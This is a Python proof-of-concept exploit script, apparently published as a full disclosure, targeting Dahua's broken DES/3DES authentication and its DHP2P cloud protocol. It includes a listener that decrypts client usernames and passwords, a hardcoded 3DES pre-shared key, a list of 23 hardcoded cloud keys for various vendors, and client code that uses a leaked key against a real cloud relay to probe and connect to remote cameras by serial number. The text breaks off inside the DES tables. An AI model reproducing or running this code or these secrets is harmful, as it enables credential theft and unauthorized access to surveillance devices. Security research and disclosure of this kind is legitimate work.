#!/usr/bin/env python3

"""
Author: bashis <mcw noemail eu> 2020
Subject: Dahua DES/3DES encrypt/decrypt, NetSDK credentials leaks, Cloud keys/passwords, DHP2P PoC

1. Dahua DES/3DES (broken) authentication implementation and PSK
2. Vulnerability: Dahua NetSDK leaking credentials (first 8 chars) from all clients in REALM request when using DVRIP and DHP2P protocol
3. PoC: Added simple TCP/37777 DVRIP listener to display decrypted credentials in clear text
4. Vulnerability: Dahua DHP2P Cloud protocol credentials leakage
5. Vulnerability: Hardcoded DHP2P Cloud keys/passwords for 23 different providers
6. PoC: Access to devices within DHP2P Cloud. PoC only made for Dahua IMOU

-=[ #1 Dahua DES/3DES (broken) authentication implementation and PSK ]=-

Dahua DES/3DES authentication implementation are broken by endianess bugs, marked below with 'Dahua endianness bug' in this script
Replicated Dahua's implemenation, both encrypt and decrypt does work.
Dahua 3DES pre-shared key (PSK): poiuytrewq

-=[ #2 Dahua NetSDK leaking credentials (first 8 chars) from all clients in REALM request when using DVRIP and DHP2P protocol ]=-

[References used below]
3DES Username: c4 a3 af 48  99 56 b6 b4 (admin)
3DES Password: 54 ab ae b6  01 21 d6 71 (donotuse)

Note: The difference to login with 3DES or request REALM lays in the second byte of the two first bytes.
Login: a0 00
REALM: a0 01

[DES/3DES Login]
00000000  a0 00 00 00  00 00 00 00  c4 a3 af 48  99 56 b6 b4  │····│····│···H│·V··│ <= 3DES Username
00000010  54 ab ae b6  01 21 d6 71  05 02 00 01  00 00 a1 aa  │T···│·!·q│····│····│ <= 3DES Password

[DVRIP REALM Request]
00000000  a0 01 00 00  00 00 00 00  c4 a3 af 48  99 56 b6 b4  │····│····│···H│·V··│ <= 3DES Username
00000010  54 ab ae b6  01 21 d6 71  05 02 00 01  00 00 a1 aa  │T···│·!·q│····│····│ <= 3DES Password


-=[ #3 Simple TCP/37777 DVRIP listener to display decrypted credentials in clear text ]=-

To verify, fire up this script with argument: --poc_3des
Then use slightly older version of ConfigTool, SmartPSS or something that use TCP/37777 DVRIP Protocol and connect to the script.

[Example]
$ ./Dahua-3DES-IMOU-PoC.py --poc_3des
[*] [Dahua 3DES/IMOU PoC 2020 bashis <mcw noemail eu>]
[+] Trying to bind to 0.0.0.0 on port 37777: Done
[+] Waiting for connections on 0.0.0.0:37777: Got connection from 192.168.57.20 on port 49168
[◢] Waiting for connections on 0.0.0.0:37777
[+] Client username: admin
[+] Client password: donotuse
[*] Closed connection to 192.168.57.20 port 49168
[*] All done
$

-=[ #4 Dahua DHP2P Cloud protocol credentials leakage ]=-

Same packets as in DVRIP exist with Dahua DHP2P Cloud, but DVRIP is encapsulated within PTCP UDP packets.

Lets look at DVRIP packet again;

[DVRIP REALM Request]
00000000  a0 01 00 00  00 00 00 00  c4 a3 af 48  99 56 b6 b4  │····│····│···H│·V··│ <= 3DES Username
00000010  54 ab ae b6  01 21 d6 71  05 02 00 01  00 00 a1 aa  │T···│·!·q│····│····│ <= 3DES Password


And now dump of DHP2P packet;

[DHP2P REALM Request]
00000000  50 54 43 50  00 00 00 18  00 00 00 14  00 00 ff eb  │PTCP│····│····│····│
00000010  00 00 00 1c  05 33 fe 32  10 00 00 20  36 ef 03 4a  │····│·3·2│··· │6··J│
00000020  00 00 00 00  a0 01 00 00  00 00 00 00  c4 a3 af 48  │····│····│····│···H│
00000030  99 56 b6 b4  54 ab ae b6  01 21 d6 71  05 02 00 01  │·V··│T···│·!·q│····│
00000040  00 00 a1 aa

If you now look very close, you will see exact same packet as in DVRIP;

[DHP2P REALM Request]
00000000  50 54 43 50  00 00 00 18  00 00 00 14  00 00 ff eb  │PTCP│····│····│····│
00000010  00 00 00 1c  05 33 fe 32  10 00 00 20  36 ef 03 4a  │····│·3·2│··· │6··J│
00000020  00 00 00 00  [a0 01 00 00  00 00 00 00  c4 a3 af 48  │····│····│····│···H│ <== DVRIP, 3DES Username
00000030  99 56 b6 b4  54 ab ae b6  01 21 d6 71  05 02 00 01  │·V··│T···│·!·q│····│  <== DVRIP, 3DES Password
00000040  00 00 a1 aa]

-=[ #5 Hardcoded DHP2P Cloud keys/passwords for 23 different providers ]=-

[DHP2P Cloud keys/passwords]
Below keys/passwords along with required usernames/FQDN/IPs where found hardcoded in 'P2PServer.exe' from self extracting archive
https://web.imoulife.com/soft/P2PSurveillance_3.01.001.3.exe

Note:
This site do not work anymore, due to following statement on https://web.imoulife.com/:
'Due to service upgrade, P2P web services will be officially discontinued on April 30, 2020, we are sorry for the inconvenience.'

YXQ3Mahe-5H-R1Z_ <============ Dahua/IMOU
Napco_20160615-U<=66>!Kz7HQzxy
CONWIN-20151111-KHTK
dhp2ptest-20150421_ydfwkfb
HiFocus-20150317_zy1
Amcrest_20150106-oyjL
Telefonica-20150209_ZLJ
BurgBiz-20141224_xyh
UYM5Tian-5Q-Q1Y_
Sentient-20141117_ztc
WatchNet-141117_qjs1
TELETEC-140925-BSChw
MEIKXXJJYKIKLKE_20140919
NAPCO_JcifenW2s3
KANGLE-140905-YSYhw
aoersi-5H-R1Z_
QY7TTVJ7vg-140523_cppLus
QY7TTVJ7vg-140522_easyCoLoSo
QY7TTVJ7vg-140422_ipTecNo
QY7TTVJ7vg-140410_Q-See
Stanley_20160704-3rb4tzBTZd
Panasonic_4q$+UtRWr]J6X\$uyKY
Da3k#kjA312

Note: All providers using different entry FQDN/IPs.

-=[ #6 Access to devices within DHP2P Cloud. PoC only made for Dahua IMOU ]=-

[Probing Device]
Note: XXXXXXXXXXXXXXX is the serial number of remote device (if S/N starts with letter, make it lowercase - some stupid bug)

$ ./Dahua-3DES-IMOU-PoC.py  --dhp2p XXXXXXXXXXXXXXX  --probe
[*] [Dahua 3DES/IMOU PoC 2020 bashis <mcw noemail eu>]
[+] Device 'XXXXXXXXXXXXXXX': Online
[*] All done
$

[Request REALM/RANDOM from Device]

Note: This PoC will only connect via Dahua DHP2P IMOU Cloud and request REALM and RANDOM from remote device.

$ ./Dahua-3DES-IMOU-PoC.py --dhp2p XXXXXXXXXXXXXXX
[*] [Dahua 3DES/IMOU PoC 2020 bashis <mcw noemail eu>]
[+] Device 'XXXXXXXXXXXXXXX': Online
[+] WSSE Authentication: Success
[+] Opening connection to 169.197.116.85 on port 27077: Done
[+] Setup P2P channel to 'XXXXXXXXXXXXXXX': Success
[*] Remote Internal IP/port: 192.168.57.20,192.168.0.108:51980
[*] Remote External IP/port: xxx.xxx.xxx.xxx:51980
[*] DHP2P Agent IP/port to remote: 169.197.116.85:27077
[+] Punching STUN hole: Success
[+] PTCP Connection: Success
[+] Received: CONN
[+] Request REALM:: Success
Realm:Login to XXXXXXXXXXXXXXX
Random:1852772904

[Disclaimer]
From here, a UDP protocol (called 'PTCP' AKA TCP-Alike-Over-UDP) is needed.

Have a nice day
/bashis

[*] All done
$

[Disclosure Timeline]
10/02/2020: Initated contact with Dahua PSIRT
13/02/2020: Pinged Dahua PSIRT after no reply
13/02/2020: Dahua PSIRT ACK
15/02/2020: Pinged Dahua PSIRT
15/02/2020: Dahua PSIRT replied they currently analyzing
16/02/2020: Clarified to Dahua PSIRT that 23 different cloud suppliers are affected
17/02/2020: Dahua PSIRT asked where and how I found cloud keys
18/02/2020: Provided additional details
26/02/2020: Received update from Dahua PSIRT for both vulnerabilites, where DES/3DES had apperantly been reported earlier by Tenable as 'login replay'
26/02/2020: Clarified again that DES/3DES issue exist both with DVRIP client traffic (such as ConfigTool, SmartPSS... etc.) and Cloud client traffic (such as IMOU, IMOU Life clients... etc.), as the DVRIP protocol is present in both
26-28/02/2020: Researched about Dahua PSIRT information about Tenable earlier report and found: https://www.tenable.com/security/research/tra-2019-36
28/02/2020: Clarified again with Dahua PSIRT about credential leakage from clients by default during REALM request, and not only during 'login'
28/02/2020: Dahua PSIRT acknowledged and stated to assign CVE with credit to both Tenable and myself
28/02/2020: Reached out to Tenable to share information with the researcher of 'login replay' about the upcoming CVE
16/04/2020: Pinged Dahua PSIRT
17/04/2020: Dahua PSIRT responded with CVEs and told they will realease security advisory on May 10, 2020
- CVE-2019-9682: DES / 3DES vulnerability
- CVE-2020-9501: 23 cloud keys disclosure
06/05/2020: Dahua PSIRT sent their security advisory, with updated date for release May 12, 2020.
09/05/2020: Full Disclosure

[Software updates]
SmartPSS: https://www.dahuasecurity.com/support/downloadCenter/softwares?id=2&child=201
NetSDK: https://www.dahuasecurity.com/support/downloadCenter/softwares?child=3
Mobile apps: https://www.dahuasecurity.com/support/downloadCenter/softwares?child=472

"""

import sys
import json
import argparse
import inspect
import datetime
import tzlocal	# sudo pip3 install tzlocal
import xmltodict # sudo pip3 install xmltodict

from pwn import *	# https://github.com/Gallopsled/pwntools

global debug

# For Dahua DES/3DES
ENCRYPT = 0x00
DECRYPT = 0x01

# For PTCP PoC
PTCP_SYN = '0002ffff'
PTCP_CONN = '11000000'
RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'

#
# DVRIP have different codes in their protocols
#
def DahuaProto(proto):

	proto = binascii.b2a_hex(proto.encode('latin-1')).decode('latin-1')

	headers = [
		'f6000000',	# JSON Send
		'f6000068',	# JSON Recv
		'a0050000', # DVRIP login Send Login Details
		'a0010060', # DVRIP Send Request Realm

		'b0000068', # DVRIP Recv
		'b0010068', # DVRIP Recv
	]

	for code in headers:
		if code[:6] == proto[:6]:
			return True

	return False


def DEBUG(direction, packet):

	if debug:
		packet = packet.encode('latin-1')

		# Print send/recv data and current line number
		print("[BEGIN {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno))
		if (debug == 2) or (debug == 3):
			print(hexdump(packet))
		if (debug == 1) or (debug == 3):
			if packet[0:8] == p64(0x2000000044484950,endian='big') or DahuaProto(packet[0:4].decode('latin-1')):

				header = packet[0:32]
				data = packet[32:]

				if header[0:8] == p64(0x2000000044484950,endian='big'): # DHIP
					print("\n-HEADER-  -DHIP-  SessionID   ID    RCVLEN             EXPLEN")
				elif DahuaProto(packet[0:4].decode('latin-1')):	# DVRIP
					print("\n PROTO   RCVLEN       ID            EXPLEN            SessionID")

				print("{}|{}|{}|{}|{}|{}|{}|{}".format(
					binascii.b2a_hex(header[0:4]).decode('latin-1'),binascii.b2a_hex(header[4:8]).decode('latin-1'),
					binascii.b2a_hex(header[8:12]).decode('latin-1'),binascii.b2a_hex(header[12:16]).decode('latin-1'),
					binascii.b2a_hex(header[16:20]).decode('latin-1'),binascii.b2a_hex(header[20:24]).decode('latin-1'),
					binascii.b2a_hex(header[24:28]).decode('latin-1'),binascii.b2a_hex(header[28:32]).decode('latin-1')))

				if data:
					print("{}\n".format(data.decode('latin-1')))
			elif packet: # Unknown packet, do hexdump
					log.failure("DEBUG: Unknow packet")
					print(hexdump(packet))
		print("[ END  {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno))
	return


#
# Based on: https://gist.github.com/bebehei/5e3357e5a1bf46ec381379ef8f525c7f
#
def DHP2P_WSSE_Generate(user_name, user_key, uri, data):

	CSeq = random.randrange(2 ** 31)
	drand = random.randrange(2 ** 31)
	curdate = datetime.datetime.utcnow().isoformat(timespec='seconds') + 'Z' # Always use UTC for created

	#
	# Dahua WSSE auth
	#
	PWD = str(drand) + str(curdate) + 'DHP2P:' + user_name +':'+ user_key

	hash_digest = hashlib.sha1()
	hash_digest.update(PWD.encode('ascii'))

	x_wsse =  ', '.join([	'{REQ} {URI} HTTP/1.1\r\n'
							'CSeq: {CSeq}\r\n'
							'Authorization: WSSE profile="UsernameToken"\r\n'
							'X-WSSE: UsernameToken Username="{user}"',
							'PasswordDigest="{digest}"',
							'Nonce="{nonce}"',
							'Created="{created}"\r\n'])
	x_wsse = x_wsse.format(
						REQ='DHGET' if not data else 'DHPOST',
						URI=uri,
						CSeq=CSeq,
						user=user_name,
						digest=base64.b64encode(hash_digest.digest()).decode('ascii'),
						nonce=drand,
						created=curdate,
					)

	if data:
		x_wsse += 'Content-Type: \r\n'
		x_wsse += 'Content-Length: {}\r\n'.format(len(data))
		x_wsse += '\r\n'
		x_wsse += data
	else:
		x_wsse += '\r\n'

	return x_wsse, int(CSeq)
#
# --------- [END] ---------
#

def HTTP_header(response):
	rxHeaderJSON = {}
	response = response.split('\r\n\r\n')
	rxHeader = response[0].split('\r\n')
	for HEAD in range(0,len(rxHeader)):
		if HEAD == 0:
			tmp = rxHeader[HEAD].split()
			rxHeaderJSON.update({"version":tmp[0]})
			rxHeaderJSON.update({"code":int(tmp[1])})
			rxHeaderJSON.update({"status":' '.join(tmp[2:])})
		else:
			tmp = rxHeader[HEAD].split(": ") # 
			rxHeaderJSON.update({tmp[0].lower(): int(tmp[1]) if (tmp[0].lower() == 'content-length') or (tmp[0].lower() == 'cseq') else tmp[1]})

	return response[1], rxHeaderJSON


#
# The DES/3DES encrypt/decrypt code in the bottom of this script.
# 
def Dahua_Gen0_hash(data, mode):

	# "secret" key for ChengDu JiaFa
#	key = b'OemChengDuJiaFa' # 3DES

	# "secret" key for Dahua Technology
	key = b'poiuytrewq' # 3DES

	if len(data) > 8: # Max 8 bytes!
		log.failure("'{}' is more than 8 bytes, this will most probaly fail".format(data))
	data = data[0:8]
	data_len = len(data)

	key_len = len(key)

	#
	# padding key with 0x00 if needed
	#
	if key_len <= 8:
		if not (key_len % 8) == 0:
			key += p8(0x0) * (8 - (key_len % 8)) # DES (8 bytes)
	elif key_len <= 16:
		if not (key_len % 16) == 0:
			key += p8(0x0) * (16 - (key_len % 16)) # 3DES DES-EDE2 (16 bytes)
	elif key_len <= 24:
		if not (key_len % 24) == 0:
			key += p8(0x0) * (24 - (key_len % 24)) # 3DES DES-EDE3 (24 bytes)
	#
	# padding data with 0x00 if needed
	#
	if not (data_len % 8) == 0:
		data += p8(0x0).decode('latin-1') * (8 - (data_len % 8))

	if key_len == 8:
		k = des(key)
	else:
		k = triple_des(key)

	if mode == ENCRYPT:
		data = k.encrypt(data.encode('latin-1'))
	else:
		data = k.decrypt(data)
		data = data.decode('latin-1').strip('\x00') # Strip all 0x00 padding

	return data


class DHP2P_P2P_Client(object):

	def __init__(self, USER, SERVER, PORT, KEY, DEVICE):
		#
		# DHP2P specific
		#
		self.USER = USER
		self.KEY = KEY
		self.SERVER = SERVER
		self.PORT = PORT
		#
		# Device we connect to
		#
		self.DEVICE = DEVICE
		#
		# self.sock: Socket for WSSE and probe traffic
		#
		self.sock = None
		#
		# STUN specific
		#
		self.BINDING_REQUEST_SIGN = b'\x00\x01'
		self.BINDING_RESPONSE_ERROR = b'\x01\x11'
		self.BINDING_RESPONSE_SUCCESS = b'\x01\x01'
		#
		# Will be set to True when we receive PTCP CONN
		# Will be set to False when we receive PTCP DISC
		#
		self.CONNECT = False
		#
		# RemoteListenID/LocalListenID is calculated how much data has been sent and received
		#
		self.SentToRemoteLEN = 0
		self.RecvToLocalLEN = 0
		self.RemoteListenID = p32(self.SentToRemoteLEN, endian='big')
		self.LocalListenID = p32(self.RecvToLocalLEN, endian='big')
		#
		#
		# 'RemoteMessageID' is required to repost from remote
		# 'LocalMessageID' can be used for own validity checks
		# 
		self.RemoteMessageID = p32(0, endian='big') # Generated by remote
		self.LocalMessageID = p32(0, endian='big') # self.LocalMessageID + self.SentToRemoteLEN
		#
		# Used to identify incoming packets
		#
		self.PacketLEN = None
		self.PacketType = None
		#
		# self.DHP2P_PTCP_PacketID() use this to generate our PacketID
		#
		self.SentPacketID = 0
		#
		# Not really used for something now, can be used for checking
		#
		self.RecvPacketID = None
		#
		# Will follow all PTCP packets during the session
		#
		self.RealmSID = p32(random.randrange(2 ** 32), endian='big')

		socket.setdefaulttimeout(3)

	def DHP2P_P2P_UDP(self, packet, P2P):

		TRY = 0

		if debug:
			log.success("Sending to: {}:{}".format(self.SERVER,str(self.PORT)))
			log.info("Sending:\n")
			print(packet)

		# for future STUN and P2P traffic
		if P2P == True:

			self.remote = remote(host=self.SERVER,port=self.PORT,typ='udp')

			while True:
				try:
					# Send data
					self.remote.send(packet.encode('latin-1'))

					# Receive response
					data = self.remote.recv()
					data = data.decode('latin-1')
					if debug:
						log.info("Receive:\n")
						print(data)
					break

				except Exception as e:
					if TRY == 3:
						log.failure(format(e))
						self.remote.close()
						return False
					log.info("Trying future STUN and P2P: {}".format(TRY))
					TRY += 1
					pass

		else:
			# For normal communication
			self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			server_address = (self.SERVER, self.PORT)

			while True:
				try:
					# Send data
					sent = self.sock.sendto(packet.encode('utf-8'), server_address)

					# Receive response
					data, server = self.sock.recvfrom(4096)
					data = data.decode('latin-1')
					if debug:
						log.info("Receive:\n")
						print(data)
					break

				except Exception as e:
					if TRY == 3:
						log.failure(format(e))
						self.sock.close()
						return False
					log.info("Trying: {}".format(TRY))
					TRY += 1
					pass

		packet = HTTP_header(data)
		#
		# Return answer if we only probing for device
		#
		if self.probe:
			return packet

		if len(packet[1]):
			#
			# Online: HTTP/1.1 100 Trying
			#
			if packet[1].get('code') == 100:
				device = log.progress("Setup P2P channel to '{}'".format(self.DEVICE))
				device.status(self.color("Trying to setup...",BLUE))
				if debug:
					log.info("Received:\n")
					print(json.dumps({'header':packet[1],
							'data':json.loads(json.dumps(xmltodict.parse(packet[0]))) if len(packet[0]) else None,
							'rhost': server[0],
							'rport': server[1]
						},indent=4))
				#
				# Wait for 'Server Nat Info!'
				#
				try:
					while packet[1].get('code') != 200:
						data, server = self.sock.recvfrom(4096)
						DEBUG("RECV",data.decode('latin-1'))
						# We can receive STUN data before 'Server Nat Info!'
						if self.CheckSTUNResponse(data):
							log.info("BINDING_REQUEST_SIGN from: {}:{}".format(self.color(server[0],BLUE),self.color(server[1],BLUE) ))
							continue
						data = data.decode('latin-1')
						packet = HTTP_header(data)
				except Exception as e:
					device.error(format(e))
					if self.sock:
						self.sock.close()
					return False
				device.success(self.color("Success",GREEN))
			#
			# Offline: HTTP/1.1 404 Not Found
			#
			elif packet[1].get('code') == 404:
				device.failure(self.color("Gone offline?",RED))

		if self.sock:
			self.sock.close()

		if debug:
			log.info("Received:\n")
			print(json.dumps({'header':packet[1],
					'data':json.loads(json.dumps(xmltodict.parse(packet[0]))) if len(packet[0]) else None,
					'rhost': self.SERVER,
					'rport': self.PORT,
				},indent=4))

		return {'header':packet[1],
				'data':json.loads(json.dumps(xmltodict.parse(packet[0]))) if len(packet[0]) else None,
				'rhost': self.SERVER,
				'rport': self.PORT,
			}


	def CheckSTUNResponse(self,response):

		if response[0:2] == self.BINDING_REQUEST_SIGN:
			if debug:
				print ('BINDING_REQUEST_SIGN')
			return True
		elif response[0:2] == self.BINDING_RESPONSE_ERROR:
			print ('BINDING_RESPONSE_ERROR')
			return False
		elif response[0:2] == self.BINDING_RESPONSE_SUCCESS:
			if debug:
				print ('BINDING_RESPONSE_SUCCESS')
			return True
		else:
			return False

	def color(self,text,color):
		return "{}{}\033[0m".format(color,text)


	def DHP2P_P2P_ProbeDevice(self):

		self.probe = True

		probe = log.progress("Device '{}'".format(self.DEVICE))
		query = None
		URI = '/probe/device/{}'.format(self.DEVICE)
		WSSE, CSeq = DHP2P_WSSE_Generate(self.USER, self.KEY, URI, query)

		probe.status(self.color("Trying...",BLUE))
		response = self.DHP2P_P2P_UDP(WSSE, False)

		if response[1].get('code') == 200:
			probe.success(self.color("Online",GREEN))
			response = True
		elif response[1].get('code') == 404:
			probe.failure(self.color("Offline",RED))
			response = False
		else:
			probe.failure(self.color(response,RED))
			response = False

		self.probe = False
		return response


	def DHP2P_P2P_WSSE(self):

		wsse = log.progress("WSSE Authentication")

		self.USER = "P2PClient"

		query = None
		URI = '/online/relay'
		WSSE, CSeq = DHP2P_WSSE_Generate(self.USER, self.KEY, URI, query)

		wsse.status(URI)
		response = self.DHP2P_P2P_UDP(WSSE, False)
		if not response:
			return False

		if not response.get("header").get("code") == 200:
			print (json.dumps(response,indent=4))
			print (WSSE)
			return False

		self.SAVED_SERVER = response.get('rhost')
		self.SAVED_PORT = response.get('rport')

		self.SERVER = response.get('data').get('body').get('Address').split(':')[0]
		self.PORT = int(response.get('data').get('body').get('Address').split(':')[1])

	#
	# ================
	#
		self.USER = ""

		query = None
		URI = '/relay/agent'
		WSSE, CSeq = DHP2P_WSSE_Generate(self.USER, self.KEY, URI, query)

		wsse.status(URI)
		response = self.DHP2P_P2P_UDP(WSSE, False)
		if not response:
			return False
		if debug:
			print (json.dumps(response,indent=4))

		self.RELAY_SERVER = response.get('data').get('body').get('Agent').split(':')[0]
		self.RELAY_PORT = int(response.get('data').get('body').get('Agent').split(':')[1])

		self.SERVER = self.RELAY_SERVER
		self.PORT = self.RELAY_PORT
	#
	# ================
	#

		self.USER = "P2PClient"

		query = '<body><Client>:0</Client></body>'
		URI = '/relay/start/{}'.format(response.get('data').get('body').get('Token'))
		WSSE, CSeq = DHP2P_WSSE_Generate(self.USER, self.KEY, URI, query)

		wsse.status(URI)
		response = self.DHP2P_P2P_UDP(WSSE, True)
		if not response:
			return False
		if debug:
			print (json.dumps(response,indent=4))

		SID = response.get('data').get('body').get('SID')
		TIMEOUT = response.get('data').get('body').get('Time')

		self.USER = "P2PClient"

		query = '<body><Identify>0 0 0 0 0 0 0 0</Identify><PubAddr>{}:{}</PubAddr></body>\r\n'.format(self.SERVER,self.PORT)
		URI = '/device/{}/p2p-channel'.format(self.DEVICE)
		WSSE, CSeq = DHP2P_WSSE_Generate(self.USER, self.KEY, URI, query)

		self.SERVER = self.SAVED_SERVER
		self.PORT = self.SAVED_PORT

		wsse.status(URI)
		response = self.DHP2P_P2P_UDP(WSSE, False)
		if not response:
			return False

#		Identify = response.get('data').get('body').get('Identify')
#		IpEncrpt = response.get('data').get('body').get('IpEncrpt')
		LocalAddr = response.get('data').get('body').get('LocalAddr')
#		NatValueT = response.get('data').get('body').get('NatValueT')
		PubAddr = response.get('data').get('body').get('PubAddr')
#		Relay = response.get('data').get('body').get('Relay')
#		version = response.get('data').get('body').get('version')

		log.info("Remote Internal IP/port: {}".format(self.color(LocalAddr,BLUE)))
		log.info("Remote External IP/port: {}".format(self.color(PubAddr,BLUE)))
		log.info("DHP2P Agent IP/port to remote: {}:{}".format(self.color(self.RELAY_SERVER,BLUE), self.color(self.RELAY_PORT,BLUE)))

		if debug:
			print (json.dumps(response,indent=4))

		wsse.success(self.color("Success",GREEN))
		return True

	#
	# Now we starting an STUN (Session Traversal Utilities through Network Address Translators) session
	#
	def DHP2P_P2P_Stun(self):

		stun = log.progress("Punching STUN hole")
		stun.status("Trying...")

		response = self.remote.recv()
		self.remote.clean() # clean the tube

		Packet = self.BINDING_RESPONSE_SUCCESS + response[2:24] + b'\x00' * 8 + response[32:]

		self.remote.send(Packet)
		#
		# Remote will send multiple responses, clean the tube after success
		#
		response = self.remote.recv(timeout=4)
		#
		# Not stable check below ...
		#
#		if not response[0:2] == self.BINDING_RESPONSE_SUCCESS:
#			stun.failure("Failed to bind")
#			return False

		self.remote.clean() # clean the tube

		stun.success(self.color("Success",GREEN))
		return True

	def DHP2P_P2P_PTCP(self):


		ptcp = log.progress("PTCP Connection")
		#
		# Used data relocated to PTCP_SEND() function
		#
		ptcp.status("SYN")
		if not self.DHP2P_PTCP_P2P(None,PTCP_SYN):
			ptcp.failure("SYN-ACK")
			return False
		ptcp.status("SYN-ACK")

		ptcp.status("CONN")
		if not self.DHP2P_PTCP_P2P(None,PTCP_CONN):
			ptcp.failure("CONN")
			return False
		ptcp.success(self.color("Success",GREEN))

		realm = log.progress("Request REALM")
		realm.status("Trying")
		#
		# PoC: DVRIP Request of REALM + RANDOM
		#
		REALM = p32(0xa0010000,endian='big') + (p8(0x00) * 20) + p64(0x050201010000a1aa,endian='big')
		data = self.DHP2P_PTCP_P2P(REALM,None)
		if not len(data):
			realm.failure("Failure")
			return False
		#
		# Print only REALM data, skip DVRIP 32 bytes binary header
		#
		print(data[32:])
		realm.success(self.color("Success",GREEN))


		print("""
[Disclaimer]
From here, a UDP protocol (called 'PTCP' AKA TCP-Alike-Over-UDP) is needed.

Have a nice day
/bashis
			""")

		return True

	def DHP2P_PTCP_P2P(self, data, DHP2P_Type):

		self.LocalMessageID = p32(int(binascii.b2a_hex(self.LocalMessageID),16) + self.SentToRemoteLEN,endian='big')

		#
		# PTCP SYN / SYN-ACK always start with this
		#
		_PTCP_SYN = b'\x00\x02\xff\xff'
		Packet = b'PTCP' + self.RemoteListenID + self.LocalListenID + (_PTCP_SYN if DHP2P_Type == PTCP_SYN else p16(0x0) + self.DHP2P_PTCP_PacketID(self.SentPacketID)) + self.LocalMessageID + self.RemoteMessageID

		if not DHP2P_Type == PTCP_SYN:
			self.remote.send(Packet)
			self.SentToRemoteLEN += len(Packet[24:])

		if DHP2P_Type == PTCP_SYN:
			data = '\x00\x03\x01\x00'
			Packet = Packet + data.encode('latin-1')

		elif DHP2P_Type == PTCP_CONN:
			_PTCP_CONN = '\x11\x00\x00\x00'
			data = '\x00\x00\x00\x00\x00\x00\x93\x91\x7f\x00\x00\x01'
			Packet = Packet + _PTCP_CONN.encode('latin-1') + self.RealmSID + data.encode('latin-1')

		else:
			#
			# DVRIP packet's from main function
			#
			Packet = Packet + p32(len(data) + 0x10000000, endian='big') + self.RealmSID + p32(0x0) + data

		if data:

			DEBUG("SEND",Packet.decode('latin-1'))
			self.remote.send(Packet)
			self.SentToRemoteLEN += len(Packet[24:])

		return self.DHP2P_PTCP_RECV()

	def DHP2P_PTCP_RECV(self):

		data = []
		try:
			while True:
				response = self.remote.recv()
				DEBUG("RECV",response.decode('latin-1'))

				self.RecvPacketID = response[12:16]
				self.RemoteMessageID = response[16:20]
				self.LocalMessageID = response[20:24]

				if len(response) > 24:

					if self.LocalListenID == response[4:8]:
						self.RecvToLocalLEN += len(response[24:])
						self.SentPacketID += len(response[24:]) # used to calculate PacketID

					self.RemoteListenID = p32(self.SentToRemoteLEN, endian='big')
					self.LocalListenID = p32(self.RecvToLocalLEN, endian='big')

					self.PacketLEN = response[24:28]
					self.PacketType = response[36:40]

					#
					# "SYN/SYN-ACK"
					#
					if binascii.b2a_hex(response[24:]).decode('latin-1') == '00030100':
						return True
					#
					# CONN / DISC
					#
					elif self.PacketLEN == b'\x12\x00\x00\x00' and self.PacketType == b'CONN':
						log.success("Received: {}".format(self.color("CONN",GREEN)))
						self.CONNECT = True
						return True
					elif self.PacketLEN == b'\x12\x00\x00\x00' and self.PacketType == b'DISC':
						log.failure("Received: {}".format(self.color("DISC",RED)))
						Packet = b'PTCP' + self.RemoteListenID + self.LocalListenID + p16(0x0) + self.DHP2P_PTCP_PacketID(self.SentPacketID) + self.LocalMessageID + self.RemoteMessageID
						self.DHP2P_PTCP_P2P(Packet,'PINGACK')
						self.CONNECT = False
						return False

					else:
						#
						# Return DVRIP packet
						#
						if len(response) > 68: # PTCP + DVRIP
							return response[36:].decode('latin-1')

		except Exception as e:
			log.failure(e)
			return False

	#
	# Not sure if this is correct, but it does the work
	#
	def DHP2P_PTCP_PacketID(self, length):
		return p16(65535 - (length), endian='big')


def Dahua_DHP2P_Login():
	USER = "P2PClient"
	SERVER = "www.easy4ipcloud.com"
	PORT = 8800
	KEY = "YXQ3Mahe-5H-R1Z_"

	DHP2P_P2P = DHP2P_P2P_Client(USER, SERVER, PORT, KEY, args.dhp2p)

	if not DHP2P_P2P.DHP2P_P2P_ProbeDevice():
		return False
	if args.probe:
		return True
	if not DHP2P_P2P.DHP2P_P2P_WSSE():
		return False
	if not DHP2P_P2P.DHP2P_P2P_Stun():
		return False
	if not DHP2P_P2P.DHP2P_P2P_PTCP():
		return False

	return True

def PoC_3des():

	try:
		s = server(port=37777, bindaddr='0.0.0.0', fam='any', typ='tcp')
		des = s.next_connection()
	except (Exception, KeyboardInterrupt, SystemExit) as e:
		print(e)
		return False

	data = des.recv(numb=8192,timeout=4).decode('latin-1')
	DEBUG("RECV", data)

	USER_NAME_HASH = data[8:16].encode('latin-1')
	USER_PASS_HASH = data[16:24].encode('latin-1')
	USER_NAME = Dahua_Gen0_hash(USER_NAME_HASH,DECRYPT) if unpack(USER_NAME_HASH,word_size = 64) else '[Leak fixed? Received 0x0]'
	PASSWORD = Dahua_Gen0_hash(USER_PASS_HASH,DECRYPT) if unpack(USER_NAME_HASH,word_size = 64) else '[Leak fixed? Received 0x0]'

	log.success("Client username: {}".format(USER_NAME))
	log.success("Client password: {}".format(PASSWORD))
	des.close()
	return False


#
# This code is based based on
#
# """
# A pure python implementation of the DES and TRIPLE DES encryption algorithms.
# Author:   Todd Whiteman
# Homepage: http://twhiteman.netfirms.com/des.html
# """
#
# [WARNING!] Do _NOT_ reuse below code for legit DES/3DES! [WARNING!]
#
# This code has been cleaned and modified so it will fit the needs to
# replicate Dahua's implemenation of DES/3DES with endianness bugs.
# (Both encrypt and decrypt will of course work)
#

# The base class shared by des and triple des.
class _baseDes(object):
	def __init__(self):
		self.block_size = 8

	def getKey(self):
		"""getKey() -> bytes"""
		return self.__key

	def setKey(self, key):
		"""Will set the crypting key for this object."""
		self.__key = key


#############################################################################
#         DES         #
#############################################################################
class des(_baseDes):

	# Permutation and translation tables for DES
	__pc1 = [
		56, 48, 40, 32, 24, 16,  8,
		0, 57, 49, 41, 33, 25, 17,
		9,  1, 58, 50, 42, 34, 26,
		18, 10,  2, 59, 51, 43, 35,
		62, 54, 46, 38, 30, 22, 14,
		6, 61, 53, 45, 37, 29, 21,
		13,  5, 60, 52, 44, 36, 28,
		20, 12,  4, 27, 19, 11,  3
	]

	# number left rotations of pc1
	__left_rotations = [
		1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
	]

	# permuted choice key (table 2)
	__pc2 = [
		13, 16, 10, 23,  0,  4,
		2, 27, 14,  5, 20,  9,
		22, 18, 11,  3, 25,  7,
		15,  6, 26, 19, 12,  1,
